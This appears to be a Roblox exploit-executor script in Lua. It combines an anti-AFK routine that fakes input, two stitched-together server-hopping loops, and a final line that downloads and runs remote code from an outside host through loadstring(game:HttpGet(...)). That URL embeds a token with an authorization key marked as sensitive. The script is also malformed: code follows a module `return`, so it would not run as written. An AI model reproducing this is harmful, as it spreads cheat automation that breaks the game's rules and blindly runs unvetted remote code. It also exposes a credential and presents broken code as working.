local VirtualUser = game:GetService("VirtualUser")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- Anti-AFK
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- Server hop function with player count check and retry
local function ServerHop()
    local placeId = game.PlaceId
    local maxRetries = 10
    local retryCount = 0
    
    while retryCount < maxRetries do
        retryCount = retryCount + 1
        print("Attempting to server hop... Attempt " .. retryCount)
        
        local success, servers = pcall(function()
            return HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. placeId .. '/servers/Public?sortOrder=Asc&limit=100'))
        end)
        
        if not success then
            print("Failed to fetch server list, retrying in 3 seconds...")
            wait(3)
            goto continue
        end
        
        local foundServer = false
        for _, server in ipairs(servers.data) do
            if server.playing < server.maxPlayers and server.playing <= 2 then
                local teleportSuccess, err = pcall(function()
                    TeleportService:TeleportToPlaceInstance(placeId, server.id, Players.LocalPlayer)
                end)
                if teleportSuccess then
                    print("Successfully teleported to server: " .. server.id)
                    return true
                else
                    print("Failed to teleport to server: " .. tostring(err))
                end
            end
        end
        
        if not foundServer then
            print("No suitable servers found, retrying in 3 seconds...")
            wait(3)
        end
        
        ::continue::
    end
    
    print("Failed to server hop after " .. maxRetries .. " attempts")
    return false
end

-- Main loop with retry
local function StartAutoHop()
    local hopTimer = 0
    local checkInterval = 5 -- Check every 5 seconds
    local hopCooldown = false
    
    while game:IsLoaded() and Players.LocalPlayer do
        wait(checkInterval)
        
        -- Skip checking if on cooldown
        if hopCooldown then
            hopTimer = hopTimer + checkInterval
            if hopTimer >= 10 then -- 10 second cooldown after failed hop
                hopCooldown = false
                hopTimer = 0
            end
            goto continue
        end
        
        hopTimer = hopTimer + checkInterval
        
        -- Get current player count
        local playerCount = #Players:GetPlayers()
        
        -- Check if we should hop
        local shouldHop = false
        
        -- Hop if 2 or fewer players (including you)
        if playerCount <= 2 then
            shouldHop = true
            print("Low player count detected (" .. playerCount .. " players), hopping...")
        end
        
        -- Hop every 10 minutes (600 seconds)
        if hopTimer >= 600 then
            shouldHop = true
            print("10 minutes passed, hopping...")
            hopTimer = 0 -- Reset timer
        end
        
        if shouldHop and playerCount > 1 then -- Don't hop if you're alone in server (no point)
            local hopped = ServerHop()
            if hopped then
                print("Successfully hopped servers!")
                hopTimer = 0 -- Reset timer after successful hop
                wait(5) -- Wait after hopping
            else
                print("Failed to hop, will retry in 5 seconds...")
                hopCooldown = true
                hopTimer = 0
                wait(5)
            end
        end
        
        ::continue::
    end
end

-- Start the auto hop system
spawn(function()
    wait(3) -- Wait for game to fully load
    StartAutoHop()
end)

-- Your original server hop script
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local Deleted = false

local File = pcall(function()
    AllIDs = HttpService:JSONDecode(readfile("server-hop-temp.json"))
end)
if not File then
    table.insert(AllIDs, actualHour)
    pcall(function()
        writefile("server-hop-temp.json", HttpService:JSONEncode(AllIDs))
    end)
end

local function TPReturner(placeId)
    local Site;
    if foundAnything == "" then
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. placeId .. '/servers/Public?sortOrder=Asc&limit=100'))
    else
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. placeId .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
    end
    local ID = ""
    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor
    end
    local num = 0;
    for i,v in pairs(Site.data) do
        local Possible = true
        ID = tostring(v.id)
        if tonumber(v.maxPlayers) > tonumber(v.playing) then
            for _,Existing in pairs(AllIDs) do
                if num ~= 0 then
                    if ID == tostring(Existing) then
                        Possible = false
                    end
                else
                    if tonumber(actualHour) ~= tonumber(Existing) then
                        local delFile = pcall(function()
                            delfile("server-hop-temp.json")
                            AllIDs = {}
                            table.insert(AllIDs, actualHour)
                        end)
                    end
                end
                num = num + 1
            end
            if Possible == true then
                table.insert(AllIDs, ID)
                wait()
                pcall(function()
                    writefile("server-hop-temp.json", HttpService:JSONEncode(AllIDs))
                    wait()
                    TeleportService:TeleportToPlaceInstance(placeId, ID, game.Players.LocalPlayer)
                end)
                wait(4)
            end
        end
    end
end

local module = {}
function module:Teleport(placeId)
    while wait() do
        pcall(function()
            TPReturner(placeId)
            if foundAnything ~= "" then
                TPReturner(placeId)
            end
        end)
    end
end
return module

-- YOUR LOADSTRING (KEEP THIS HERE)
loadstring(game:HttpGet("https://api.project-reverse.org/run/DONT_SHARE_THIS_SCRIPT_THIS_CONTAINS_YOUR_SENSETIVE_INFO/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImF1dGhvcml6YXRpb25LZXkiOiIkMmIkMTAkQWZHeWxmNjUzL2cwa2tsTE5ncHdKLmRCby5ScVBJb1FVN1ZXVzAuMkJhRDhDYU5BRjc5ZEsiLCJraW5kIjoiam9pbmVyIn0"))()
